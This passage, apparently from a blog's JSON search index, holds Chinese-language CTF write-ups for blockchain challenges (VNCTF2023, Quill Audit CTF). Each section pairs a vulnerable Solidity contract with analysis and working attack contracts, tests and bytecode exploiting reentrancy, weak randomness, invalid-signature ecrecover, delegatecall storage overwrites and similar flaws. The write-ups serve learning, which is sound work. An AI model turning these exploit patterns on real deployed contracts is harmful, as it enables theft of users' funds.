(PlayerGuess == winningOption) &#123;\n            PlayerWins[Player] = PlayerWins[Player] + 1;\n        &#125; else &#123;\n            PlayerWins[Player] = 0;\n        &#125;\n        Player = address(0);\n    &#125;\n\n    function Winer() public view returns (uint256) &#123;\n        return (PlayerWins[msg.sender]);\n    &#125;\n\n    function sendValue(address payable recipient, uint256 amount) internal &#123;\n        require(address(this).balance >= amount);\n\n        (bool success, ) = recipient.call&#123;value: amount&#125;(\"\");\n    &#125;\n\n    function withdrawMoney(address _to) public payable &#123;\n        require(PlayerWins[msg.sender] >= 3);\n        require(msg.sender == _to);\n        if (PlayerWins[_to] >= 3) &#123;\n            uint256 amount = PlayerPool[_to];\n            PlayerPool[_to] = 0;\n            sendValue(payable(_to), amount);\n        &#125;\n    &#125;\n\n    function withdrawFirstWin() external &#123;\n        require(!GetMoney[msg.sender]);\n        PlayerPool[msg.sender] = PlayerPool[msg.sender] + 1 ether;\n        withdrawMoney(msg.sender);\n        GetMoney[msg.sender] = true;\n    &#125;\n\n    function isSolved() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    receive() external payable &#123;&#125;\n&#125;\n\nAnalyseRandomCoina函数随机数漏洞+withdrawFirstWin函数重入漏洞\nAttackcontract attack&#123;\n    GuessGame public target;\n    constructor(address _target)payable&#123;\n        require(msg.value == 3 ether);\n        target = GuessGame(payable(_target));\n    &#125;\n    function RandomCoin() private view returns (uint256) &#123;\n        return\n            uint256(keccak256(abi.encodePacked(block.timestamp ^ 0x1234567))) %\n            2;\n    &#125;\n    function pwn()public&#123;\n        for(;address(this).balance!=0;)\n        &#123;target.guess&#123;value:1 ether&#125;(RandomCoin());\n        target.revealResult();&#125;\n        target.withdrawFirstWin();\n    &#125;\n    fallback()external payable&#123;\n        while(address(target).balance != 0)&#123;\n            target.withdrawFirstWin();\n        &#125;\n    &#125;\n&#125;\n\n0x03 元宇宙大师safemint的两个图片隐写，用工具解密以下得到flag\n\n","slug":"VNCTF2023","date":"2023-02-26T17:45:43.913Z","categories_index":"","tags_index":"区块链 ctf","author_index":"bcYng"},{"id":"44a7f484fa434c0aa60841dc0d5e49cd","title":"Quill Audit CTF","content":"QuillCTF看到Quill在弄的区块链安全CTF题目，看到完成奖励很是心动\n\n只是可惜，发现这个挑战时候已经结束了五道题，只剩下三道题目，不过看起来应该还在更新之中，本着挑战一下的心态还是来试一试吧\n\n0x0B Panda TokenCode// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8;\nimport \"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\";\nimport \"openzeppelin-contracts/contracts/access/Ownable.sol\";\n\ncontract PandaToken is ERC20, Ownable &#123;\n    uint public c1;\n    mapping(bytes => bool) public usedSignatures;\n    mapping(address => uint) public burnPending;\n    event show_uint(uint u);\n\n    function sMint(uint amount) external onlyOwner &#123;\n        _mint(msg.sender, amount);\n    &#125;\n\n    constructor(\n        uint _c1,\n        string memory tokenName,\n        string memory tokenSymbol\n    ) ERC20(tokenName, tokenSymbol) &#123;\n        assembly &#123;\n            let ptr := mload(0x40)\n            mstore(ptr, sload(mul(1, 110)))\n            mstore(add(ptr, 0x20), 0)\n            let slot := keccak256(ptr, 0x40)\n            sstore(slot, exp(10, add(4, mul(3, 5))))\n            mstore(ptr, sload(5))\n            sstore(6, _c1)\n            mstore(add(ptr, 0x20), 0)\n            let slot1 := keccak256(ptr, 0x40)\n            mstore(ptr, sload(7))\n            mstore(add(ptr, 0x20), 0)\n            sstore(slot1, mul(sload(slot), 2))\n        &#125;\n    &#125;\n\n    function calculateAmount(\n        uint I1ILLI1L1ILLIL1LLI1IL1IL1IL1L\n    ) public view returns (uint) &#123;\n        uint I1I1LI111IL1IL1LLI1IL1IL11L1L;\n        assembly &#123;\n            let I1ILLI1L1IL1IL1LLI1IL1IL11L1L := 2\n            let I1ILLILL1IL1IL1LLI1IL1IL11L1L := 1000\n            let I1ILLI1L1IL1IL1LLI1IL1IL11L11 := 14382\n            let I1ILLI1L1IL1ILLLLI1IL1IL11L1L := 14382\n            let I1LLLI1L1IL1IL1LLI1IL1IL11L1L := 599\n            let I1ILLI111IL1IL1LLI1IL1IL11L1L := 1\n            I1I1LI111IL1IL1LLI1IL1IL11L1L := div(\n                mul(\n                    I1ILLI1L1ILLIL1LLI1IL1IL1IL1L,\n                    I1ILLILL1IL1IL1LLI1IL1IL11L1L\n                ),\n                add(\n                    I1LLLI1L1IL1IL1LLI1IL1IL11L1L,\n                    add(I1ILLI111IL1IL1LLI1IL1IL11L1L, sload(6))\n                )\n            )\n        &#125;\n\n        return I1I1LI111IL1IL1LLI1IL1IL11L1L;\n    &#125;\n\n    function getTokens(uint amount, bytes memory signature) external &#123;\n        uint giftAmount = calculateAmount(amount);\n\n        bytes32 msgHash = keccak256(abi.encode(msg.sender, giftAmount));\n        bytes32 r;\n        bytes32 s;\n        uint8 v;\n\n        assembly &#123;\n            r := mload(add(signature, 0x20))\n            s := mload(add(signature, 0x40))\n            v := byte(0, mload(add(signature, 0x60)))\n        &#125;\n\n        address giftFrom = ecrecover(msgHash, v, r, s);\n        burnPending[giftFrom] += amount;\n        require(amount == 1 ether, \"amount error\");\n        require(\n            (balanceOf(giftFrom) - burnPending[giftFrom]) >= amount,\n            \"balance\"\n        );\n        require(!usedSignatures[signature], \"used signature\");\n        usedSignatures[signature] = true;\n        _mint(msg.sender, amount);\n    &#125;\n\n    function burnPendings(address burnFrom) external onlyOwner &#123;\n        burnPending[burnFrom] = 0;\n        _burn(burnFrom, burnPending[burnFrom]);\n    &#125;\n&#125;\n\n\nfondry:\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.7;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/PandaToken.sol\";\n\ncontract Hack is Test &#123;\n    PandaToken pandatoken;\n    address owner = vm.addr(1);\n    address hacker = vm.addr(2);\n\n    function setUp() external &#123;\n        vm.prank(owner);\n        pandatoken = new PandaToken(400, \"PandaToken\", \"PND\");\n    &#125;\n\n    function test() public &#123;\n        vm.startPrank(hacker);\n        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);\n\n        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.\n        // solution\n        ...\n       \n\n        assertEq(pandatoken.balanceOf(hacker), 3 ether);\n    &#125;\n&#125;\n\n\nAnalysesMint函数可以直接铸造3个Token，属于错误的函数可见性，但是作为一道中等题，考点应该不在于此先放一下直接mint的测试结果\nit(\"success\",async () => &#123;\n       // start hack\n       await contract.connect(attacker).sMint(Value)\n       console.log(await contract.balanceOf(attacker.address))\n       // end\n       expect(await contract.balanceOf(attacker.address)).to.eq(Value);\n   &#125;);\n\n\n再来分析一下getTokens函数，amount必须是1 ether，使用给定的signature解析出的r，s，v进行ecrecover，获取giftFrom，在进行数值判断，满足条件即可mint，signature不可以使用重复的。设想一下如果是invalid signature的情况下，recover出来的giftFrom应该是address(0)，在constructor函数中0地址的余额（slot&#x3D;&#x3D;keccak(key(0)+slot(00))）被修改为10e18\n\n所以getTokens函数的require条件得以满足，乱写几个signature即可\nAttackdescribe(\"Pandatoken\",async () => &#123;\n    let owner,attacker,contract;\n    const Value = ethers.utils.parseEther(\"3\");\n    before(async () => &#123;\n        [owner, attacker] = await ethers.getSigners();\n        const Contract = await ethers.getContractFactory(\"PandaToken\",owner);\n        contract = await Contract.deploy(400, \"PandaToken\", \"PND\");\n    &#125;);\n\n    it(\"success\",async () => &#123;\n        // start hack\n        let hash = '0x9d22949dff2c7abb89af237f4baade600fff2e8d7d32e2129275c61e92f3e645'\n        //keccak256(abi.encode(attacker,7 ether))\n        let hash2 = '0x64a7f84c4b0ac27463993ca0b8cf9ce816846d3a12666752818074abe74443b2'\n        //keccak256(abi.encode(attacker,8 ether))\n        let hash3 = '0xa0de168b144c38cbcbd8adfc07a5e142cff643e06e912b0edea5ffb20456d8f9'\n        //keccak256(abi.encode(attacker,9 ether))\n        await contract.connect(attacker).getTokens(ethers.utils.parseEther(\"1\"),hash)\n        await contract.connect(attacker).getTokens(ethers.utils.parseEther(\"1\"),hash2)\n        await contract.connect(attacker).getTokens(ethers.utils.parseEther(\"1\"),hash3)\n        console.log(await contract.balanceOf(attacker.address))\n        // end\n        expect(await contract.balanceOf(attacker.address)).to.eq(Value);\n    &#125;);\n&#125;)\n\n\n0x0A GateCodepragma solidity ^0.8.17;\n\ninterface IGuardian &#123;\n    function f00000000_bvvvdlt() external view returns (address);\n\n    function f00000001_grffjzz() external view returns (address);\n&#125;\n\ncontract Gate &#123;\n    bool public opened;\n\n    function open(address guardian) external &#123;\n        uint256 codeSize;\n        assembly &#123;\n            codeSize := extcodesize(guardian)\n        &#125;\n        require(codeSize &lt; 33, \"bad code size\");\n\n        require(\n            IGuardian(guardian).f00000000_bvvvdlt() == address(this),\n            \"invalid pass\"\n        );\n        require(\n            IGuardian(guardian).f00000001_grffjzz() == tx.origin,\n            \"invalid pass\"\n        );\n\n        (bool success, ) = guardian.call(abi.encodeWithSignature(\"fail()\"));\n        require(!success);\n\n        opened = true;\n    &#125;\n&#125;\n\nAnalyse要求在32 opcodes之内完成题目要求f00000000_bvvvdlt()函数返回msg.sender，f00000001_grffjzz()函数返回tx.origin，fail()返回false或者调用失败\nswitch case会超过32 opcodes限制，先测试两个函数的selector，分别是bytes4(0)和bytes4(1)，所以可以直接把函数选择器作为if判断的条件，其次，我将f00000001_grffjzz()和fail()函数归为一类进行判断，因为二者的selector都为非0值，将f00000001_grffjzz.selector（0x00000001）右移57（228 bits）位将会变成0，而将fail.selector（0xa9cc4718）右移57（228 bits）位将会是一个非零值\n0000    34  CALLVALUE\n0001    80  DUP1\n0002    35  CALLDATALOAD\n0003    80  DUP1\n0004    60  PUSH1 0x0d\n0006    57  *JUMPI\n0007    33  CALLER\n0008    34  CALLVALUE\n0009    52  MSTORE\n000A    60  PUSH1 0x18\n000C    56  *JUMP\n000D    5B  JUMPDEST\n000E    80  DUP1\n000F    60  PUSH1 0xe4\n0011    1C  SHR\n0012    60  PUSH1 0x1c\n0014    57  *JUMPI\n0015    32  ORIGIN\n0016    34  CALLVALUE\n0017    52  MSTORE\n0018    5B  JUMPDEST\n0019    38  CODESIZE\n001A    34  CALLVALUE\n001B    F3  *RETURN\n001C    5B  JUMPDEST\n001D    34  CALLVALUE\n001E    34  CALLVALUE\n001F    FD  *REVERT\n\n\n反编译，逻辑正确\n\n最终构建：0x34803580600d573334526018565b8060e41c601c573234525b3834f35b3434fd\nAttack攻击方式和下边的Collatz Puzzle一题攻击方式一样，因为Collatz Puzzle题目时间靠前一些，所以写的早一些\n\n\n0x09 WETH10Codepragma solidity ^0.8.0;\n\nimport &#123;ERC20&#125; from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport &#123;ReentrancyGuard&#125; from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport &#123;Address&#125; from \"@openzeppelin/contracts/utils/Address.sol\";\n\n// The Messi Wrapped Ether\ncontract WETH10 is ERC20(\"Messi Wrapped Ether\", \"WETH10\"), ReentrancyGuard &#123;\n    receive() external payable &#123;\n        deposit();\n    &#125;\n\n    function _burnAll() internal &#123;\n        _burn(msg.sender, balanceOf(msg.sender));\n    &#125;\n\n    function deposit() public payable nonReentrant &#123;\n        _mint(msg.sender, msg.value);\n    &#125;\n\n    function withdraw(uint256 wad) external nonReentrant &#123;\n        Address.sendValue(payable(msg.sender), wad);\n        _burn(msg.sender, wad);\n    &#125;\n\n    function withdrawAll() external nonReentrant &#123;\n        Address.sendValue(payable(msg.sender), balanceOf(msg.sender));\n        _burnAll();\n    &#125;\n\n    /// @notice Request a flash loan in ETH\n    function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant &#123;\n        uint256 prevBalance = address(this).balance;\n        Address.functionCallWithValue(receiver, data, amount);\n\n        require(address(this).balance >= prevBalance, \"flash loan not returned\");\n    &#125;\n&#125;\n\nAnalyse在_burnAll函数中执行的逻辑是burn掉msg.sender的余额那么多Token，但是在withdrawAll函数中先执行了发送以太币，在burn的操作，也就是说我们可以在receive函数中恶意控制balance，循环直至合约余额清空\n可惜这道题当时没有想到思路，直到看了wp才清楚了思路逻辑😮‍💨\nAttackcontract WETH10Exploit &#123;\n    WETH10 weth;\n    address payable bob;\n\n    constructor(WETH10 _weth10, address _bob) payable &#123;\n        weth = _weth10;\n        bob = payable(_bob);\n    &#125;\n\n    function attack() external &#123;\n\n        for (; address(weth).balance != 0;) &#123;\n            weth.deposit&#123;value: 1 ether&#125;();\n            weth.withdrawAll();\n            \n            // Execution passes to weth10, which sends eth to address(this)\n            // triggering the receive() function\n            \n            weth.transferFrom(bob, address(this), 1 ether);\n        &#125;\n        (bool success, ) = bob.call&#123;value: address(this).balance&#125;(\"\");\n        require(success);\n    &#125;\n\n    receive() external payable &#123;\n        weth.transfer(bob, 1 ether);\n    &#125;\n&#125;\n\n\ndescribe(\"WETH10\",async () => &#123;\n    let owner,attacker,contract,data;\n    const Value = ethers.utils.parseEther(\"10\");\n    before(async () => &#123;\n        [owner, attacker] = await ethers.getSigners();\n        contract = await ethers.getContractFactory('WETH10', owner).then(f => f.deploy());\n        await contract.deployed();\n        await setBalance(contract.address,Value)\n    &#125;);\n\n    it(\"success\",async () => &#123;\n        // data = get_data(attacker.address);\n        // console.log(contract.address);\n        expect(await ethers.provider.getBalance(contract.address)).to.eq(Value);\n        // start hack\n        let Exploit = await ethers.getContractFactory(\"WETH10Exploit\",attacker);\n        let exploit = await Exploit.deploy(contract.address,attacker.address);\n        await contract.connect(attacker).approve(exploit.address,BigInt((100e18).toString()));\n        await setBalance(attacker.address,ethers.utils.parseEther(\"2\"))\n        await exploit.connect(attacker).attack(&#123;value:ethers.utils.parseEther('1')&#125;);\n        console.log(await ethers.provider.getBalance(attacker.address));\n        // end\n        expect(await ethers.provider.getBalance(contract.address)).to.eq('0');\n        expect(await ethers.provider.getBalance(attacker.address)).to.gte(ethers.utils.parseEther(\"11\"));\n        // await attContract.connect(attacker).pwn(contract.address);\n    &#125;);\n&#125;)\n\n\n0x08 PelusaCode// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ninterface IGame &#123;\n    function getBallPossesion() external view returns (address);\n&#125;\n\ncontract Pelusa &#123;\n    address private immutable owner;\n    address internal player;\n    uint256 public goals = 1;\n\n    constructor() &#123;\n        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));\n    &#125;\n\n    function passTheBall() external &#123;\n        require(msg.sender.code.length == 0, \"Only EOA players\");\n        require(uint256(uint160(msg.sender)) % 100 == 10, \"not allowed\");\n\n        player = msg.sender;\n    &#125;\n\n    function isGoal() public view returns (bool) &#123;\n        // expect ball in owners posession\n        return IGame(player).getBallPossesion() == owner;\n    &#125;\n\n    function shoot() external &#123;\n        require(isGoal(), \"missed\");\n\t\t\t\t/// @dev use \"the hand of god\" trick\n        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(\"handOfGod()\"));\n        require(success, \"missed\");\n        require(uint256(bytes32(data)) == 22_06_1986);\n    &#125;\n&#125;\n\nAnalyse第一题不是很难，先来捋一下考点，目标是shoot()成功一次。\n\n外部调用getBallPossesion()函数返回pelusa合约的owner值。（读取变量）\n\n修改当前合约的player值。（constructor绕过EOA检测，create2跑出特殊地址）\n\n向player进行delegatecall，要求调用成功，returndata数值大小等于22_06_1986。（外部调用）\n\n\nowner使用了immutable存储方式，简单说一下和constant的区别，前者为不可变量，后者为常量，不遵守智能合约变量存储优化原则。constant不支持运行时赋值而immutable可以，值呗硬编码到bytecode之中，所以获得包邮特code再去decompile即可获得owner值\n\n拿到Code进行反编译，太长了直接上关键部分\nfunction func_01A8() returns (var r0) &#123;\n        var var0 &#x3D; 0x00;\n        var var1 &#x3D; 0xffffffffffffffffffffffffffffffffffffffff &amp; 0x00000000000000000000000045ba9924e7a4a9dfd99cd846bca2d34e28579f85;\n        var var2 &#x3D; storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff;\n        var var3 &#x3D; 0xe09235ad;\n        var temp0 &#x3D; memory[0x40:0x60];\n        memory[temp0:temp0 + 0x20] &#x3D; (var3 &amp; 0xffffffff) &lt;&lt; 0xe0;\n        var var4 &#x3D; temp0 + 0x04;\n        var var5 &#x3D; 0x20;\n        var var6 &#x3D; memory[0x40:0x60];\n        var var7 &#x3D; var4 - var6;\n        var var8 &#x3D; var6;\n        var var9 &#x3D; var2;\n        var var10 &#x3D; !address(var9).code.length;\n    \n        if (var10) &#123; revert(memory[0x00:0x00]); &#125;\n    \n        var temp1;\n        temp1, memory[var6:var6 + var5] &#x3D; address(var9).staticcall.gas(msg.gas)(memory[var8:var8 + var7]);\n        var5 &#x3D; !temp1;\n    \n        if (!var5) &#123;\n            var temp2 &#x3D; memory[0x40:0x60];\n            var temp3 &#x3D; returndata.length;\n            memory[0x40:0x60] &#x3D; temp2 + (temp3 + 0x1f &amp; ~0x1f);\n            var2 &#x3D; 0x027f;\n            var4 &#x3D; temp2;\n            var3 &#x3D; var4 + temp3;\n            var2 &#x3D; func_049C(var3, var4);\n            return var2 &amp; 0xffffffffffffffffffffffffffffffffffffffff &#x3D;&#x3D; var1;\n        &#125; else &#123;\n            var temp4 &#x3D; returndata.length;\n            memory[0x00:0x00 + temp4] &#x3D; returndata[0x00:0x00 + temp4];\n            revert(memory[0x00:0x00 + returndata.length]);\n        &#125;\n    &#125;\n\n分析一下可以知道这个函数是passTheBall()函数，所以var1也就是owner值\n剩下的考点比较简单了，直接贴代码\nAttackcontract attack&#123;\n    address public target;\n    address public p_owner;\n    constructor(address _target,address _p_owner)&#123;\n        target = _target;\n        p_owner = _p_owner;\n        Pelusa(target).passTheBall();\n    &#125;\n    function handOfGod()public pure returns(bytes32)&#123;\n        return bytes32(uint(0x150a3a2));\n    &#125;\n    function getBallPossesion()public view returns(address)&#123;\n        return p_owner;\n    &#125;\n    function pwn()public&#123;\n        Pelusa(target).shoot();\n    &#125;\n&#125;\n\ncontract Deployer &#123;\n    address public a;\n    function deploy(bytes memory bytecode,uint salt) internal returns (address)&#123;\n        address addr;\n        assembly &#123;\n          addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)\n        &#125;\n\n        return addr;\n    &#125;\n    function get(bytes memory code,uint salt)public &#123;\n        a=deploy(code,salt);\n    &#125;\n&#125;\n\nfrom web3 import Web3,HTTPProvider\ntarget = pelusa\ndeployingaddr = deployer\ncode = attack.code\ncode += target[2:].rjust(64,'0')\ncode += p_owner from decompile\ns=Web3.keccak(hexstr=code)\na=''.join(['%02x'%b for b in s]) \n\nfor i in range(0x0,0xfffffffffffffff):\n    salt=hex(i)[2:].rjust(64,'0')\n    p=Web3.keccak(hexstr=('0xff' + deployingaddr[2:] + salt + a))[12:].hex()\n    print(salt,p)\n    if int(p,16)%100 == 10:\n        print('0x'+salt,p)\n        print('0x'+code)\n        break\n\n最后调用一下pwn函数即可成功\n0x07 True XORCode// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IBoolGiver &#123;\n  function giveBool() external view returns (bool);\n&#125;\n\ncontract TrueXOR &#123;\n  function callMe(address target) external view returns (bool) &#123;\n    bool p = IBoolGiver(target).giveBool();\n    bool q = IBoolGiver(target).giveBool();\n    require((p &amp;&amp; q) != (p || q), \"bad bools\");\n    require(msg.sender == tx.origin, \"bad sender\");\n    return true;\n  &#125;\n&#125;\n\nAnalyse题目代码非常的简单，稍微分析一下就可以明白，再一次调用之中返回两次不同的bool值即可\n但是注意到这里的函数被view修饰，也就是说我们不能在攻击合约之中使用常规的状态判断来返回不同的值\n比如：\ncontract attack&#123;\n\t\tbool public flag;\n    function giveBool() external view returns (bool)&#123;\n        if(!flag)\n        &#123;\n        \t\tfalg = !flag;\n        \t\treturn false;\n        &#125;\n        else &#123;return true;&#125;\n    &#125;\n&#125;\n\n想了一些办法，可是看起来好像调用时完全相同的(msg.sender, tx.origin, block.timestamp)，几乎是完全相同的环境\n再深入的想一下，两个bool值在两次看似相同的交易中被赋值，但实际上，两次交易存在不同之处–Gas\n所以用gas作为判断条件来返回不同的值即可\n先随便写一个数值调用，将会revert，debug看一下gasleft的值\n\nGAS自身消耗2 gas，remaing gas为2928727，最后相减一下就是gasleft，更改正确数值，编写攻击合约\nAttackcontract attack&#123;\n    function giveBool() external view returns (bool)&#123;\n        uint gas = gasleft();\n        if(gas==2928727-2)\n        &#123;return false;&#125;\n        else &#123;return true;&#125;\n    &#125;\n&#125;\n\n\n0x06 Collatz PuzzleCode// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface ICollatz &#123;\n  function collatzIteration(uint256 n) external pure returns (uint256);\n&#125;\n\ncontract CollatzPuzzle is ICollatz &#123;\n  function collatzIteration(uint256 n) public pure override returns (uint256) &#123;\n    if (n % 2 == 0) &#123;\n      return n / 2;\n    &#125; else &#123;\n      return 3 * n + 1;\n    &#125;\n  &#125;\n\n  function callMe(address addr) external view returns (bool) &#123;\n    // check code size\n    uint256 size;\n    assembly &#123;\n      size := extcodesize(addr)\n    &#125;\n    require(size > 0 &amp;&amp; size &lt;= 32, \"bad code size!\");\n\n    // check results to be matching\n    uint p;\n    uint q;\n    for (uint256 n = 1; n &lt; 200; n++) &#123;\n      // local result\n      p = n;\n      for (uint256 i = 0; i &lt; 5; i++) &#123;\n        p = collatzIteration(p);\n      &#125;\n      // your result\n      q = n;\n      for (uint256 i = 0; i &lt; 5; i++) &#123;\n        q = ICollatz(addr).collatzIteration&#123;gas: 100&#125;(q);\n      &#125;\n      require(p == q, \"result mismatch!\");\n    &#125;\n\n    return true;\n  &#125;\n&#125;\n\nAnalyse在200次调用过程中，每次包含了五次对collatzIteration()函数的调用，要求200次的返回值pq相同\n但是要求外部调用的地址必须是合约地址同时codeSize不可以超过32，并且每次在外部调用过程中只赋予了100gas，所以使用合约进行解题就是不可能的了，只能使用opcode进行合约编写，同时又要精简写法来达到目标\n难点在于构建合约的bytecode\n首先来构建runtimecode\n100gas还是比较容易满足的，但是codesize&lt;&#x3D;32的条件有些难度。大概的逻辑就是\nvar data :&#x3D; calldataload(0x4)\nif mod(data,2) &#123;\nmstore(0x60,add(mul(3,data),1))\nreturn(0x60,0x80)\n&#125;\nmstore(0x60,div(data,2))\nreturn(0x60,0x80)\n&#125;\n\n使用if mod(a,b)进行判断相比于switch case方式减少了一些jump和eq的操作，但是两次return浪费了不少的code，并且在计算过程中push很浪费资源，所以明白问题出在了哪里之后，在适当的地址jump，使用一些非push的数据获取方法（caller，origin，codesize等）即可\n可以选择在if中执行mstore之后直接跳转至最后一条return而不是两次return，同时存储地址(0x60)并非唯一答案，可以用其他方式赋值，我选择了使用callvalue\n构建如下\n 0000    60  PUSH1 0x04\n0002    35  CALLDATALOAD\n0003    60  PUSH1 0x02\n0005    81  DUP2\n0006    06  MOD\n0007    15  ISZERO\n0008    60  PUSH1 0x15\n000A    57  JUMPI\n000B    60  PUSH1 0x01\n000D    81  DUP2\n000E    60  PUSH1 0x03\n0010    02  MUL\n0011    01  ADD\n0012    60  PUSH1 0x1a\n0014    56  JUMP\n0015    5B  JUMPDEST\n0016    60  PUSH1 0x02\n0018    81  DUP2\n0019    04  DIV\n001A    5B  JUMPDEST\n001B    34  CALLVALUE\n001C    52  MSTORE\n001D    38  CODESIZE\n001E    34  CALLVALUE\n001F    F3  RETURN\n\n刚好满足codesize&#x3D;&#x3D;32\n计算一下当n为奇数偶数时gas消耗都不会超过100\n再构建initcode\n 0000    60  PUSH1 0x46\n0002    60  PUSH1 0x0c\n0004    60  PUSH1 0x00\n0006    39  CODECOPY\n0007    60  PUSH1 0x23\n0009    60  PUSH1 0x00\n000B    F3  *RETURN\n\n所以最终的code就是\n6046600c60003960236000f3++600435600281061560155760018160030201601a565b600281045b34523834f3\n\n反编译一下\n\n逻辑正确\nAttackfrom web3 import Web3,HTTPProvider\nimport binascii\nimport asyncio\nw3 = Web3(HTTPProvider('url'))\nprint(w3.isConnected())\n\nprivatekey='privatekey'\naddress=w3.eth.account.from_key(privatekey).address\nprint(address)\n\n\ndef main():\n    nonce = w3.eth.getTransactionCount(address)\n    gasPrice = w3.eth.gasPrice\n    transaction = &#123;'from': address,\n                    'nonce':nonce,\n                    'gasPrice': gasPrice,\n                    'gas': 3000000,\n                    'data': '0x6046600c60003960236000f3600435600281061560155760018160030201601a565b600281045b60605260206060f3'&#125;\n\n    signed_tx = w3.eth.account.signTransaction(transaction, privatekey)\n    txn_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)\n    w3.eth.wait_for_transaction_receipt(txn_hash)\n    print(w3.eth.getTransactionReceipt(Web3.toHex(txn_hash)))\nmain()\n\n或使用solidity进行部署\ncontract Deployer &#123;\n    constructor(bytes memory code) &#123; assembly &#123; return (add(code, 0x20), mload(code)) &#125; &#125;\n&#125;\n//直接部署runtimecode\n\n部署合约，在以此地址为参数调用题目合约的collatzIteration()函数\n\n\n成功返回true\n0x05 D31eg4t3Code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract D31eg4t3&#123;\n\n\n    uint a = 12345;\n    uint8 b = 32;\n    string private d; \n    uint32 private c; \n    string private mot;\n    address public owner;\n    mapping (address => bool) public canYouHackMe;\n\n    modifier onlyOwner&#123;\n        require(false, \"Not a Owner\");\n        _;\n    &#125;\n\n    constructor() &#123;\n        owner = msg.sender;\n    &#125;\n\n    function hackMe(bytes calldata bites) public returns(bool, bytes memory) &#123;\n        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);\n        return (r, msge);\n    &#125;\n\n\n    function hacked() public onlyOwner&#123;\n        canYouHackMe[msg.sender] = true;\n    &#125;\n&#125;\n\nAnalyseowner在slot5，delegatecall覆盖变量\n0x04 safeNFTCodepragma solidity 0.8.7;\n\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\n\ncontract safeNFT is ERC721Enumerable &#123;\n    uint256 price;\n    mapping(address=>bool) public canClaim;\n\n    constructor(string memory tokenName, string memory tokenSymbol,uint256 _price) ERC721(tokenName, tokenSymbol) &#123;\n        price = _price; //price = 0.01 ETH\n    &#125;\n\n    function buyNFT() external payable &#123;\n        require(price==msg.value,\"INVALID_VALUE\");\n        canClaim[msg.sender] = true;\n    &#125;\n\n    function claim() external &#123;\n        require(canClaim[msg.sender],\"CANT_MINT\");\n        _safeMint(msg.sender, totalSupply()); \n        canClaim[msg.sender] = false;\n    &#125;\n \n&#125;\n\nClaim multiple NFTs for the price of one.\nAnalyse_safeMint–&gt;_checkOnERC721Received–&gt;onERC721Received(external)有一个重入\nAttackcontract attack &#123;\n  uint private n;\n  uint private count=2;\n  address public owner;\n  safeNFT public target;\n  // initiate the pwnage by purchasing a single NFT\n  // we will re-enter later via onERC721Received\n  constructor(address _target)&#123;\n      owner = msg.sender;\n      target = safeNFT(_target);\n  &#125;\n  function pwn() external payable &#123;\n    target.buyNFT&#123;value: msg.value&#125;();\n    target.claim();\n  &#125;\n\n  function onERC721Received(address,address,uint256 ID,bytes calldata) external returns (bytes4) &#123;\n    target.transferFrom(address(this), owner, ID);\n    n++;\n    if (n != count) &#123;\n      target.claim();\n    &#125;\n    return this.onERC721Received.selector;\n  &#125;\n&#125;\n\n0x03 VIP BankCode// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.7;\n\ncontract VIP_Bank&#123;\n\n    address public manager;\n    mapping(address => uint) public balances;\n    mapping(address => bool) public VIP;\n    uint public maxETH = 0.5 ether;\n\n    constructor() &#123;\n        manager = msg.sender;\n    &#125;\n\n    modifier onlyManager() &#123;\n        require(msg.sender == manager , \"you are not manager\");\n        _;\n    &#125;\n\n    modifier onlyVIP() &#123;\n        require(VIP[msg.sender] == true, \"you are not our VIP customer\");\n        _;\n    &#125;\n\n    function addVIP(address addr) public onlyManager &#123;\n        VIP[addr] = true;\n    &#125;\n\n    function deposit() public payable onlyVIP &#123;\n        require(msg.value &lt;= 0.05 ether, \"Cannot deposit more than 0.05 ETH per transaction\");\n        balances[msg.sender] += msg.value;\n    &#125;\n\n    function withdraw(uint _amount) public onlyVIP &#123;\n        require(address(this).balance &lt;= maxETH, \"Cannot withdraw more than 0.5 ETH per transaction\");\n        require(balances[msg.sender] >= _amount, \"Not enough ether\");\n        balances[msg.sender] -= _amount;\n        (bool success,) = payable(msg.sender).call&#123;value: _amount&#125;(\"\");\n        require(success, \"Withdraw Failed!\");\n    &#125;\n\n    function contractBalance() public view returns (uint)&#123;\n        return address(this).balance;\n    &#125;\n\n&#125;\n\nAt any cost, lock the VIP user balance forever into the contract.\nAnalyseselfdestruct转账，让合约余额大于0.05 ether\n0x02 Confidential HashCode// SPDX-License-Identifier: MIT\npragma solidity 0.8.7;\n\ncontract Confidential &#123;\n    string public firstUser = \"ALICE\";\n    uint public alice_age = 24;\n\t\tbytes32 private ALICE_PRIVATE_KEY; //Super Secret Key\n    bytes32 public ALICE_DATA = \"QWxpY2UK\";\n    bytes32 private aliceHash = hash(ALICE_PRIVATE_KEY, ALICE_DATA);\n\n    string public secondUser = \"BOB\";\n    uint public bob_age = 21;\n    bytes32 private BOB_PRIVATE_KEY; // Super Secret Key\n    bytes32 public BOB_DATA = \"Qm9iCg\";\n    bytes32 private bobHash = hash(BOB_PRIVATE_KEY, BOB_DATA);\n\t\t\n\t\tconstructor() &#123;&#125;\n\n    function hash(bytes32 key1, bytes32 key2) public pure returns (bytes32) &#123;\n        return keccak256(abi.encodePacked(key1, key2));\n    &#125;\n\n    function checkthehash(bytes32 _hash) public view returns(bool)&#123;\n        require (_hash == hash(aliceHash, bobHash));\n        return true;\n   